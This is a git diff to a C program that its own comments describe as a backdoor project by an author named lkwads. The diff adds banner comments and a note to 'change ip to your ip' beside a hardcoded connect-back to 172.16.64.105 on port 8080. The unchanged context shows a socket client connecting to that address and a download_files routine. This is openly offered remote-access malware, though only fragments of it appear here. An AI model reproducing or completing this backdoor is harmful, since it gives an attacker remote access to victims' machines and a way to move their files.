@@ -1,3 +1,7 @@
+//Lkwads 
+//Backdoor project using c Produced by lkwads
+// I hope you like this project
+
 #include <stdio.h>
 #include <stdlib.h> /* pour exit */
 #include <stdint.h>
@@ -30,7 +34,7 @@ int main(){
     struct sockaddr_in ska ;
     ska.sin_family = AF_INET ;
     ska.sin_port = htons(8080) ;
-    inet_pton(AF_INET, "172.16.64.105", &ska.sin_addr);
+    inet_pton(AF_INET, "172.16.64.105", &ska.sin_addr); //change ip to your ip 
     //connection with server
     int status = connect(cs, (struct sockaddr *)&ska, sizeof(ska)) ;
     if(status < 0){
@@ -154,3 +158,12 @@ int download_files(char msg[256], int cs, FILE *fp){
     memset(buffer, 0, sizeof(buffer));
     return 0 ;
 }
+
+
+
+
+
+
+//Lkwads 
+//Backdoor project using c Produced by lkwads
+// I hope you like this project
